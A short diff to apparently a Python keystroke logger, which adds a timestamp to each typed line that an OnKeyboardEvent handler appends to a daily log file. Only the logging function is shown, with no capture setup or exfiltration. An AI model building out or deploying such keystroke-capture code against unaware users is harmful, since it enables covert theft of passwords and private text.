@@ -9,8 +9,9 @@ line_buffer = "" #current typed line before return character
 window_name = "" #current window
 
 def SaveLineToFile(line):
+    time = datetime.now().strftime('%I-%M-%S')
     todays_file = open(file_name, 'a') #open todays file (append mode)
-    todays_file.write(line) #append line to file
+    todays_file.write(time +" "+ line) #append line to file
     todays_file.close() #close todays file
 
 def OnKeyboardEvent(event):
